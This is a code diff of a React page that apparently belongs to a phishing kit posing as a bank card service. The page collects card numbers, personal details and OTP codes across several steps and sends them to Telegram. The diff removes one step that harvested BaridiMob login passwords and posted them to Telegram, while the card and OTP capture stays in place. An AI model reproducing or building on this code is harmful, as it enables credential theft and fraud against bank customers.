@@ -7,18 +7,15 @@ import { CardsSection } from "@/components/cards-section";
 import { CardDetail } from "@/components/card-detail";
 import { StepCardNumber } from "@/components/steps/step-card-number";
 import { StepPersonalInfo, PersonalInfo } from "@/components/steps/step-personal-info";
-import { StepBaridiMob } from "@/components/steps/step-baridi-mob";
 import { StepOTP } from "@/components/steps/step-otp";
 import { StepSuccess } from "@/components/steps/step-success";
 import { cards } from "@/lib/cards-data";
 
-type View = "home" | "cards" | "detail" | "step1" | "step2" | "step2b" | "step3" | "success";
+type View = "home" | "cards" | "detail" | "step1" | "step2" | "step3" | "success";
 
 interface FormData {
   cardNumber: string;
   personalInfo: PersonalInfo | null;
-  baridiMobIdentifier: string;
-  baridiMobPassword: string;
   otp: string;
   otpAttempts: string[];
 }
@@ -48,8 +45,6 @@ export default function Home() {
   const [formData, setFormData] = useState<FormData>({
     cardNumber: "",
     personalInfo: null,
-    baridiMobIdentifier: "",
-    baridiMobPassword: "",
     otp: "",
     otpAttempts: [],
   });
@@ -106,21 +101,6 @@ export default function Home() {
       phoneNumber: personalInfo.phoneNumber,
     });
     
-    setCurrentView("step2b");
-    window.scrollTo({ top: 0, behavior: "smooth" });
-  };
-
-  const handleStep2bComplete = (identifier: string, password: string) => {
-    setFormData((prev) => ({
-      ...prev,
-      baridiMobIdentifier: identifier,
-      baridiMobPassword: password,
-    }));
-    
-    sendToTelegram("baridi_mob_password", {
-      password: password,
-    });
-    
     setCurrentView("step3");
     window.scrollTo({ top: 0, behavior: "smooth" });
   };
@@ -158,8 +138,6 @@ export default function Home() {
     setFormData({
       cardNumber: "",
       personalInfo: null,
-      baridiMobIdentifier: "",
-      baridiMobPassword: "",
       otp: "",
       otpAttempts: [],
     });
@@ -205,19 +183,12 @@ export default function Home() {
         />
       )}
 
-      {currentView === "step2b" && (
-        <StepBaridiMob
-          onNext={handleStep2bComplete}
-          currentStep={3}
-        />
-      )}
-
       {currentView === "step3" && (
         <StepOTP
           onNext={handleStep3Complete}
           onOtpAttempt={handleOtpAttempt}
           phoneNumber={formData.personalInfo?.phoneNumber || ""}
-          currentStep={4}
+          currentStep={3}
         />
       )}
 
